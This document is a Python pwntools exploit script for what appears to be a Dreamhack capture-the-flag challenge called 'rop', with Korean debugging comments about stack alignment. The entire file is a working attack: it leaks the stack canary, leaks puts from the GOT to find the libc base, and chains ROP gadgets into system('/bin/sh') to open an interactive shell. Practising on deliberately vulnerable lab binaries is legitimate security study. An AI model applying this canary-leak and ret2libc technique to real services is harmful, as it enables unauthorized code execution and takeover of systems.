from pwn import *

p = remote('127.0.0.1', 7182)
#p = remote('host3.dreamhack.games', 19984)
#p = process('./rop')
e = ELF('./rop')
libc = ELF('./libc.so.6')

context.arch = 'amd64'
context.log_level = 'debug'

ret = 0x400596
pop_rdi = 0x400853
pop_rsi_r15 = pop_rdi - 2
shell = 0x1b3e1a

puts_plt = e.plt['puts']
puts_got = e.got['puts']

buf = b"A"*0x39
p.sendafter(b"Buf: ", buf)
p.recvuntil(buf)
cnry = u64(b'\x00' + p.recvn(7))

buf = b"A"*0x38 + p64(cnry)
buf += p64(ret)
buf += p64(pop_rdi)
buf += p64(puts_got)
buf += p64(puts_plt)
buf += p64(ret)
buf += p64(0x4006f8) # main symbol + 1 (stack alignment)

p.sendafter(b"Buf: ", buf)
libc_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - libc.sym['puts']


print("libc base->", hex(libc_base))
print("SYSTEM->", hex(libc_base + libc.sym['system']))
print("shell->", hex(shell))
print("canary->", hex(cnry))

p.sendafter(b"Buf: ", b"andsopwn")

buf = b"A"*0x38 + p64(cnry) + b"B"*0x8 # 이게 문제였다. ret로 채워줬다 생각했는데 stack align이 깨졌나보다
buf += p64(ret)
buf += p64(pop_rdi)
buf += p64(libc_base + list(libc.search(b'/bin/sh'))[0]) # /bin/sh
buf += p64(libc_base + libc.sym['system'] + 1)
# puts_plt랑 별 반 다름 없으니까 libc_base는 제대로 구했고 동작하는게 맞음
# /bin/sh 위치는 잘 구했음 뭐가 문젤까

p.sendlineafter(b"Buf: ", buf)
p.interactive()

